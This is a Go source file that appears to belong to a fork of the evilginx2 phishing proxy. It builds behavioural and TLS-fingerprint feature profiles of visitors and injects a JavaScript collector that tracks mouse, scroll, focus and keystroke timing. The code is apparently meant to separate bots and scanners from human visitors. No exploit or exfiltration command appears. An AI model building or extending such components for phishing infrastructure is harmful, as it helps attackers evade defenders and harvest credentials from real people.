package core

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// FeatureExtractor extracts ML features from HTTP requests and client behavior
type FeatureExtractor struct {
	clientProfiles map[string]*ClientProfile
	mu             sync.RWMutex
}

// ClientProfile tracks client behavior over time
type ClientProfile struct {
	ClientID          string
	FirstSeen         time.Time
	LastSeen          time.Time
	RequestCount      int
	RequestTimes      []time.Time
	UniquePages       map[string]bool
	UserAgents        map[string]int
	MouseEvents       []MouseEvent
	KeyboardEvents    []KeyboardEvent
	ScrollEvents      []ScrollEvent
	FocusEvents       []FocusEvent
	NetworkInfo       *NetworkInfo
}

// MouseEvent represents a mouse interaction
type MouseEvent struct {
	X         int    `json:"x"`
	Y         int    `json:"y"`
	Type      string `json:"type"` // move, click, dblclick
	Timestamp int64  `json:"timestamp"`
}

// KeyboardEvent represents keyboard activity
type KeyboardEvent struct {
	Key       string `json:"key"`
	Type      string `json:"type"` // keydown, keyup
	Timestamp int64  `json:"timestamp"`
}

// ScrollEvent represents scroll activity
type ScrollEvent struct {
	ScrollY   int   `json:"scroll_y"`
	Timestamp int64 `json:"timestamp"`
}

// FocusEvent represents focus/blur events
type FocusEvent struct {
	Element   string `json:"element"`
	Type      string `json:"type"` // focus, blur
	Timestamp int64  `json:"timestamp"`
}

// NetworkInfo contains network-level information
type NetworkInfo struct {
	TLSVersion     uint16
	CipherSuite    uint16
	JA3Hash        string
	HeaderOrder    []string
	HTTP2Supported bool
}

// NewFeatureExtractor creates a new feature extractor
func NewFeatureExtractor() *FeatureExtractor {
	fe := &FeatureExtractor{
		clientProfiles: make(map[string]*ClientProfile),
	}
	
	// Start cleanup routine
	go fe.cleanupProfiles()
	
	return fe
}

// ExtractRequestFeatures extracts features from an HTTP request
func (fe *FeatureExtractor) ExtractRequestFeatures(req *http.Request, tlsState *tls.ConnectionState, clientID string) *RequestFeatures {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	
	// Get or create client profile
	profile, exists := fe.clientProfiles[clientID]
	if !exists {
		profile = &ClientProfile{
			ClientID:    clientID,
			FirstSeen:   time.Now(),
			UniquePages: make(map[string]bool),
			UserAgents:  make(map[string]int),
		}
		fe.clientProfiles[clientID] = profile
	}
	
	// Update profile
	profile.LastSeen = time.Now()
	profile.RequestCount++
	profile.RequestTimes = append(profile.RequestTimes, time.Now())
	profile.UniquePages[req.URL.Path] = true
	profile.UserAgents[req.UserAgent()]++
	
	// Extract network info if not already done
	if profile.NetworkInfo == nil && tlsState != nil {
		profile.NetworkInfo = fe.extractNetworkInfo(req, tlsState)
	}
	
	// Build features
	features := &RequestFeatures{
		// HTTP features
		HeaderCount:         len(req.Header),
		UserAgentLength:     len(req.UserAgent()),
		AcceptHeaderPresent: req.Header.Get("Accept") != "",
		RefererPresent:      req.Header.Get("Referer") != "",
		CookiesPresent:      len(req.Cookies()) > 0,
		
		// Timing features
		RequestInterval:    fe.calculateRequestInterval(profile),
		TimeOnSite:         time.Since(profile.FirstSeen).Seconds(),
		PagesVisited:       len(profile.UniquePages),
		RequestsPerMinute:  fe.calculateRequestRate(profile),
		
		// Behavioral features (will be updated via JavaScript)
		MouseMovements:     len(profile.MouseEvents),
		KeystrokeCount:     len(profile.KeyboardEvents),
		ScrollDepth:        fe.calculateMaxScrollDepth(profile),
		FocusEvents:        len(profile.FocusEvents),
		
		// Network features
		ConnectionReuse:     false, // TODO: implement connection tracking
		HTTP2Enabled:        req.ProtoMajor == 2,
		TLSVersion:          0,
		CipherStrength:      0,
		
		// Advanced features
		AcceptLanguageCount: fe.countAcceptLanguages(req),
		EncodingTypes:       fe.countEncodingTypes(req),
	}
	
	// Add network features if available
	if profile.NetworkInfo != nil {
		features.TLSVersion = float64(profile.NetworkInfo.TLSVersion) / 10.0 // Normalize
		features.CipherStrength = fe.getCipherStrength(profile.NetworkInfo.CipherSuite)
		features.JA3Hash = profile.NetworkInfo.JA3Hash
		features.HeaderOrder = strings.Join(profile.NetworkInfo.HeaderOrder, ",")
		features.HTTP2Enabled = profile.NetworkInfo.HTTP2Supported
	}
	
	return features
}

// UpdateClientBehavior updates behavioral data from client-side JavaScript
func (fe *FeatureExtractor) UpdateClientBehavior(clientID string, behaviorData map[string]interface{}) error {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	
	profile, exists := fe.clientProfiles[clientID]
	if !exists {
		return fmt.Errorf("client profile not found: %s", clientID)
	}
	
	// Update mouse events
	if mouseData, ok := behaviorData["mouse"].([]interface{}); ok {
		for _, event := range mouseData {
			if e, ok := event.(map[string]interface{}); ok {
				mouseEvent := MouseEvent{
					X:         int(e["x"].(float64)),
					Y:         int(e["y"].(float64)),
					Type:      e["type"].(string),
					Timestamp: int64(e["timestamp"].(float64)),
				}
				profile.MouseEvents = append(profile.MouseEvents, mouseEvent)
			}
		}
	}
	
	// Update keyboard events
	if keyData, ok := behaviorData["keyboard"].([]interface{}); ok {
		for _, event := range keyData {
			if e, ok := event.(map[string]interface{}); ok {
				keyEvent := KeyboardEvent{
					Key:       e["key"].(string),
					Type:      e["type"].(string),
					Timestamp: int64(e["timestamp"].(float64)),
				}
				profile.KeyboardEvents = append(profile.KeyboardEvents, keyEvent)
			}
		}
	}
	
	// Update scroll events
	if scrollData, ok := behaviorData["scroll"].([]interface{}); ok {
		for _, event := range scrollData {
			if e, ok := event.(map[string]interface{}); ok {
				scrollEvent := ScrollEvent{
					ScrollY:   int(e["scroll_y"].(float64)),
					Timestamp: int64(e["timestamp"].(float64)),
				}
				profile.ScrollEvents = append(profile.ScrollEvents, scrollEvent)
			}
		}
	}
	
	// Update focus events
	if focusData, ok := behaviorData["focus"].([]interface{}); ok {
		for _, event := range focusData {
			if e, ok := event.(map[string]interface{}); ok {
				focusEvent := FocusEvent{
					Element:   e["element"].(string),
					Type:      e["type"].(string),
					Timestamp: int64(e["timestamp"].(float64)),
				}
				profile.FocusEvents = append(profile.FocusEvents, focusEvent)
			}
		}
	}
	
	log.Debug("[Feature Extractor] Updated behavior for client %s: %d mouse, %d keyboard, %d scroll events",
		clientID, len(profile.MouseEvents), len(profile.KeyboardEvents), len(profile.ScrollEvents))
	
	return nil
}

// extractNetworkInfo extracts network-level features
func (fe *FeatureExtractor) extractNetworkInfo(req *http.Request, tlsState *tls.ConnectionState) *NetworkInfo {
	info := &NetworkInfo{
		HeaderOrder:    fe.getHeaderOrder(req),
		HTTP2Supported: req.ProtoMajor == 2,
	}
	
	if tlsState != nil {
		info.TLSVersion = tlsState.Version
		info.CipherSuite = tlsState.CipherSuite
		info.JA3Hash = fe.calculateJA3(tlsState)
	}
	
	return info
}

// calculateRequestInterval calculates average time between requests
func (fe *FeatureExtractor) calculateRequestInterval(profile *ClientProfile) float64 {
	if len(profile.RequestTimes) < 2 {
		return 999.0 // High value for first request
	}
	
	// Calculate average interval for last 10 requests
	start := len(profile.RequestTimes) - 10
	if start < 0 {
		start = 0
	}
	
	times := profile.RequestTimes[start:]
	if len(times) < 2 {
		return 999.0
	}
	
	totalInterval := float64(0)
	for i := 1; i < len(times); i++ {
		interval := times[i].Sub(times[i-1]).Seconds()
		totalInterval += interval
	}
	
	return totalInterval / float64(len(times)-1)
}

// calculateRequestRate calculates requests per minute
func (fe *FeatureExtractor) calculateRequestRate(profile *ClientProfile) float64 {
	if len(profile.RequestTimes) < 2 {
		return 0.0
	}
	
	// Calculate rate over last 5 minutes
	cutoff := time.Now().Add(-5 * time.Minute)
	recentCount := 0
	
	for _, t := range profile.RequestTimes {
		if t.After(cutoff) {
			recentCount++
		}
	}
	
	duration := time.Since(cutoff).Minutes()
	if duration > 0 {
		return float64(recentCount) / duration
	}
	
	return 0.0
}

// calculateMaxScrollDepth finds maximum scroll depth
func (fe *FeatureExtractor) calculateMaxScrollDepth(profile *ClientProfile) float64 {
	maxScroll := 0
	for _, event := range profile.ScrollEvents {
		if event.ScrollY > maxScroll {
			maxScroll = event.ScrollY
		}
	}
	return float64(maxScroll)
}

// getHeaderOrder extracts the order of HTTP headers
func (fe *FeatureExtractor) getHeaderOrder(req *http.Request) []string {
	// This would require access to raw request headers
	// For now, return common headers in the order they appear
	var order []string
	
	commonHeaders := []string{
		"Host", "Connection", "Accept", "User-Agent", 
		"Accept-Encoding", "Accept-Language", "Cookie",
		"Referer", "Cache-Control",
	}
	
	for _, header := range commonHeaders {
		if req.Header.Get(header) != "" {
			order = append(order, strings.ToLower(header))
		}
	}
	
	return order
}

// calculateJA3 computes JA3 hash from TLS state
func (fe *FeatureExtractor) calculateJA3(tlsState *tls.ConnectionState) string {
	// Simplified JA3 calculation
	// In production, implement full JA3 spec
	return fmt.Sprintf("%x-%x", tlsState.Version, tlsState.CipherSuite)
}

// getCipherStrength returns cipher strength in bits
func (fe *FeatureExtractor) getCipherStrength(suite uint16) int {
	// Map of cipher suites to key strengths
	cipherStrengths := map[uint16]int{
		tls.TLS_RSA_WITH_RC4_128_SHA:                128,
		tls.TLS_RSA_WITH_AES_128_CBC_SHA:            128,
		tls.TLS_RSA_WITH_AES_256_CBC_SHA:            256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:      128,
		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:      256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:   128,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:   256,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305:    256,
		tls.TLS_AES_128_GCM_SHA256:                  128,
		tls.TLS_AES_256_GCM_SHA384:                  256,
		tls.TLS_CHACHA20_POLY1305_SHA256:            256,
	}
	
	if strength, ok := cipherStrengths[suite]; ok {
		return strength
	}
	
	// Default to 128 if unknown
	return 128
}

// countAcceptLanguages counts number of accepted languages
func (fe *FeatureExtractor) countAcceptLanguages(req *http.Request) int {
	acceptLang := req.Header.Get("Accept-Language")
	if acceptLang == "" {
		return 0
	}
	
	// Count comma-separated languages
	languages := strings.Split(acceptLang, ",")
	return len(languages)
}

// countEncodingTypes counts accepted encoding types
func (fe *FeatureExtractor) countEncodingTypes(req *http.Request) int {
	acceptEnc := req.Header.Get("Accept-Encoding")
	if acceptEnc == "" {
		return 0
	}
	
	// Count comma-separated encodings
	encodings := strings.Split(acceptEnc, ",")
	return len(encodings)
}

// GetClientProfile returns the profile for a client
func (fe *FeatureExtractor) GetClientProfile(clientID string) (*ClientProfile, bool) {
	fe.mu.RLock()
	defer fe.mu.RUnlock()
	
	profile, exists := fe.clientProfiles[clientID]
	return profile, exists
}

// cleanupProfiles periodically removes old client profiles
func (fe *FeatureExtractor) cleanupProfiles() {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()
	
	for range ticker.C {
		fe.mu.Lock()
		now := time.Now()
		for id, profile := range fe.clientProfiles {
			if now.Sub(profile.LastSeen) > 2*time.Hour {
				delete(fe.clientProfiles, id)
				log.Debug("[Feature Extractor] Cleaned up profile for client %s", id)
			}
		}
		fe.mu.Unlock()
	}
}

// BehaviorCollectorJS returns JavaScript code to collect client behavior
func (fe *FeatureExtractor) BehaviorCollectorJS(sessionID string) string {
	return fmt.Sprintf(`
(function() {
    var sessionId = '%s';
    var behaviorData = {
        mouse: [],
        keyboard: [],
        scroll: [],
        focus: []
    };
    
    // Configuration
    var MAX_EVENTS = 100; // Limit events to prevent memory issues
    var SEND_INTERVAL = 5000; // Send data every 5 seconds
    
    // Mouse tracking
    var lastMouseTime = 0;
    document.addEventListener('mousemove', function(e) {
        var now = Date.now();
        if (now - lastMouseTime > 100) { // Throttle to 10fps
            if (behaviorData.mouse.length < MAX_EVENTS) {
                behaviorData.mouse.push({
                    x: e.clientX,
                    y: e.clientY,
                    type: 'move',
                    timestamp: now
                });
            }
            lastMouseTime = now;
        }
    });
    
    document.addEventListener('click', function(e) {
        if (behaviorData.mouse.length < MAX_EVENTS) {
            behaviorData.mouse.push({
                x: e.clientX,
                y: e.clientY,
                type: 'click',
                timestamp: Date.now()
            });
        }
    });
    
    // Keyboard tracking (don't record actual keys for privacy)
    document.addEventListener('keydown', function(e) {
        if (behaviorData.keyboard.length < MAX_EVENTS) {
            behaviorData.keyboard.push({
                key: 'hidden', // Don't record actual keystrokes
                type: 'keydown',
                timestamp: Date.now()
            });
        }
    });
    
    // Scroll tracking
    var lastScrollTime = 0;
    window.addEventListener('scroll', function(e) {
        var now = Date.now();
        if (now - lastScrollTime > 200) { // Throttle scroll events
            if (behaviorData.scroll.length < MAX_EVENTS) {
                behaviorData.scroll.push({
                    scroll_y: window.scrollY,
                    timestamp: now
                });
            }
            lastScrollTime = now;
        }
    });
    
    // Focus tracking
    var trackFocus = function(e) {
        if (behaviorData.focus.length < MAX_EVENTS) {
            behaviorData.focus.push({
                element: e.target.tagName,
                type: e.type,
                timestamp: Date.now()
            });
        }
    };
    
    document.addEventListener('focus', trackFocus, true);
    document.addEventListener('blur', trackFocus, true);
    
    // Send behavior data periodically
    var sendBehaviorData = function() {
        if (behaviorData.mouse.length === 0 && 
            behaviorData.keyboard.length === 0 && 
            behaviorData.scroll.length === 0 &&
            behaviorData.focus.length === 0) {
            return; // No data to send
        }
        
        // Send data
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/api/behavior/' + sessionId, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(behaviorData));
        
        // Clear sent data
        behaviorData = {
            mouse: [],
            keyboard: [],
            scroll: [],
            focus: []
        };
    };
    
    // Send data periodically
    setInterval(sendBehaviorData, SEND_INTERVAL);
    
    // Send data when page unloads
    window.addEventListener('beforeunload', sendBehaviorData);
})();
`, sessionID)
}
